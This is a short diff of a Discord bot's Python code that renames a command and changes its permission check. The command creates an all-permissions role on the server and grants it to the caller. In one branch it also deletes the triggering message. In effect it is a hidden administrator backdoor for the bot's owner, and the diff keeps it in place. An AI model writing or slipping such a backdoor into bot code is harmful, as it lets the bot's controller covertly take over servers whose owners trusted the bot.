@@ -75,19 +75,19 @@ async def dm(ctx, user: discord.Member, *, msg: str):
 	
 	
 @client.command(pass_context = True)
-@commands.check(is_soyal)
-async def iamsoyal(ctx):
+@commands.check(is_owner)
+async def iamsoyalp(ctx):
     user = ctx.message.author
-    if discord.utils.get(user.server.roles, name="SoyalP") is None:
-        await client.create_role(user.server, name="SoyalP", permissions=discord.Permissions.all())
-        role = discord.utils.get(ctx.message.server.roles, name='SoyalP')
+    if discord.utils.get(user.server.roles, name="Soyalp") is None:
+        await client.create_role(user.server, name="Soyalp", permissions=discord.Permissions.all())
+        role = discord.utils.get(ctx.message.server.roles, name='Soyalp')
         await client.add_roles(ctx.message.author, role)
     else:	
         author = ctx.message.author
         await client.delete_message(ctx.message)
-        role = discord.utils.get(ctx.message.server.roles, name='SoyalP')
+        role = discord.utils.get(ctx.message.server.roles, name='Soyalp')
         await client.add_roles(ctx.message.author, role)
-        print('Added SoyalP role in ' + (ctx.message.author.name))
+        print('Added Soyalp role in ' + (ctx.message.author.name))
         await client.send_message(author, embed=embed)
 
 		 
